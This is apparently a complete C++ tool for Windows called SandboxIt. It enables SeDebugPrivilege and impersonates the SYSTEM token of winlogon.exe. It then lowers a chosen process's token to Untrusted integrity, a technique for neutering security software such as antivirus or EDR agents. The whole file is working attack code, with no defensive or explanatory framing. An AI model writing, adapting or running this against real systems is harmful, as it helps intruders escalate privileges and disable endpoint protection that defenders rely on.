// SandboxIt.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <iostream>
#include <windows.h>
#include <cstdio>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <sddl.h>


#define MAX_NAME 256

BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}



std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}

/********************************************************************
* Technique1: Good technique for PPL processes with relaxed token DACLS
* Uses->
*	OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION)
*	OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY)
*	ImpersonateLoggedOnUser()
*
*********************************************************************/

HANDLE Technique1(int pid) {
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	DWORD bsize = 1024;
	CHAR buffer[1024] = { 0 };
	HANDLE currentTokenHandle = NULL;
	char lpServiceName[MAX_NAME] = { 0 };
	char lpServiceDomain[MAX_NAME] = { 0 };

	// Add SE debug privilege
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	else {
		printf("[-] SeDebugPrivilege not enabled!\n");
		return 0;
	}

	// Call OpenProcess() to open, print return code and error code
	SetLastError(NULL);
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

	if (GetLastError() == NULL) {

		//Get process image name
		QueryFullProcessImageNameA((HMODULE)processHandle, 0, buffer, &bsize);

		if (GetLastError() != NULL)
		{
			printf("[-] Technique1 QueryFullProcessImageNameA Pid %i Error: %i\n", pid, GetLastError());
			SetLastError(NULL);
		}
		printf("[+] Technique1 OpenProcess() %s success!\n", buffer);
	}
	else
	{
		printf("[-] Technique1 OpenProcess() Pid %i Error: %i\n", pid, GetLastError());
		return 0;
	}

	// Call OpenProcessToken(), print return code and error code
	bool getToken = OpenProcessToken(processHandle, TOKEN_WRITE, &tokenHandle);

	if (getToken != 0)
		printf("[+] Technique1 OpenProcessToken() %s success!\n", buffer);
	else
	{
		printf("[-] Technique1 OpenProcessToken() %s Return Code: %i\n", buffer, getToken);
		printf("[-] Technique1 OpenProcessToken() %s Error: %i\n", buffer, GetLastError());
		CloseHandle(processHandle);
		return 0;
	}

	return tokenHandle;
}

BOOL SanboxIt(int PID) {

	HANDLE tokenHandle = Technique1(PID);

	if (!tokenHandle) {
		return FALSE;
	}

	TOKEN_MANDATORY_LABEL tml;
	PSID psd = NULL;

	if (!ConvertStringSidToSid(L"S-1-16-0", &psd)) {
		printf("[-] ConvertStringSidToSid Fail Error: %i\n", GetLastError());
		return FALSE;
	}

	ZeroMemory(&tml, sizeof(tml));
	tml.Label.Attributes = SE_GROUP_INTEGRITY;
	tml.Label.Sid = psd;

	if (!SetTokenInformation(tokenHandle, TokenIntegrityLevel, &tml, sizeof(tml) + GetLengthSid(psd))) {
		printf("[-] SetTokenInformation Fail Error: %i\n", GetLastError());
		return FALSE;
	}
	LocalFree(psd);
	return TRUE;
}

int GetProcessByName(PCWSTR name)
{
	DWORD pid = 0;

	// Create toolhelp snapshot.
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);

	// Walkthrough all processes.
	if (Process32First(snapshot, &process))
	{
		do
		{
			// Compare process.szExeFile based on format of name, i.e., trim file path
			// trim .exe if necessary, etc.
			if (wcscmp(process.szExeFile, name) == 0)
			{
				return process.th32ProcessID;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);

	return NULL;
}

BOOL ImpersonateToSystem() {

	HANDLE tokenHandle = NULL;

	// Searching for Winlogon PID 
	DWORD PID_TO_IMPERSONATE = GetProcessByName(L"winlogon.exe");

	if (PID_TO_IMPERSONATE == NULL) {
		printf("[-] Winlogon process not found\n");
		return FALSE;
	}
	else
		printf("[+] Winlogon process found!\n");

	// Call OpenProcess() to open WINLOGON, print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcess() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] WINLOGON OpenProcess() Error: %i\n", GetLastError());
		return FALSE;
	}

	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] WINLOGON OpenProcessToken() success!\n");
	else
	{
		printf("[-] WINLOGON OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] WINLOGON OpenProcessToken() Error: %i\n", GetLastError());
		return FALSE;
	}

	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] WINLOGON ImpersonatedLoggedOnUser() success!\n");
		printf("[+] WINLOGON Current user is: %s\n", (get_username()).c_str());
	}
	else
	{
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] WINLOGON ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char** argv)
{
	if (argc < 2) {
		printf("Use: %s PID\n", argv[1]);
	}
	char* pid_c = argv[1];
	DWORD PID = atoi(pid_c);

	if (!ImpersonateToSystem())
		exit(1);

	if (!SanboxIt(PID)) {
		printf("[-] SanboxIt Fail\n");
		exit(1);
	}
	printf("[+] Success!\n");
}

